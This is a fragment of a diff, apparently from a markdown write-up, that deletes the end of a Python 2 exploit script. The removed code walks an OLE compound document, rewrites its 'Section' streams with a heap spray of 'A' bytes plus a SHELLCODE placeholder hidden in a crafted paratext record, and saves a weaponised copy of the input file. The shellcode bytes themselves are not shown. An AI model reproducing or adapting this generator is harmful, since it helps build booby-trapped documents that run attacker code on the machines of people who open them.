@@ -137,55 +137,6 @@ def append_paratext(payload, end=0):
 	
     ...
 
-	print 'heap spray...'
-	z += append_paratext( 'A'*0x5000000 + SHELLCODE )	
-
-	print 'end'
-	z += append_paratext('\x41\x00', 1)		# end marker (important)
-	
-	dst_strm.Write(zlib_inflate(z))
-
-def exploit(dst_stg, src_stg):
-	if src_stg == None or dst_stg == None:
-		print "[*] Invalid storage."
-		sys.exit(-1)
-
-	enum = src_stg.EnumElements()
-
-	for stat in enum:
-		if stat[1] == STGTY_STORAGE:
-			# Storage
-			name = stat[0]
-			sub_src_stg = src_stg.OpenStorage(name, None, STGM_READ | STGM_SHARE_EXCLUSIVE, None, 0)
-			sub_dst_stg = dst_stg.CreateStorage(name, STGM_READWRITE | STGM_CREATE | STGM_SHARE_EXCLUSIVE, 0, 0)
-			exploit(sub_dst_stg, sub_src_stg)
-
-		elif stat[1] == STGTY_STREAM:
-			name = stat[0]
-			src_strm = src_stg.OpenStream(name, None, STGM_READ | STGM_SHARE_EXCLUSIVE, 0)
-			dst_strm = dst_stg.CreateStream(name, STGM_READWRITE | STGM_CREATE | STGM_SHARE_EXCLUSIVE, 0, 0)
-
-			if (src_strm == None or dst_strm == None):
-				print "[*] Invalid stream."
-				sys.exit(-1)
-
-			if name[:7]=="Section":
-				modify_section0(dst_strm, src_strm)
-				continue
-				
-			src_strm.CopyTo(dst_strm, stat[2])
-
-if __name__ == '__main__':
-	print "[*] Start exploit."
-	
-	src_stg = StgOpenStorage(sys.argv[1], None, (STGM_READWRITE | STGM_SHARE_EXCLUSIVE), None, 0)
-	dst_stg = StgCreateDocfile('exp'+sys.argv[1], (STGM_READWRITE | STGM_SHARE_EXCLUSIVE |  STGM_CREATE), 0)
-
-	exploit(dst_stg, src_stg)
-
-	dst_stg.Commit(STGC_DEFAULT)
-
-	print "[*] End exploit"
 ```
 
 <br>
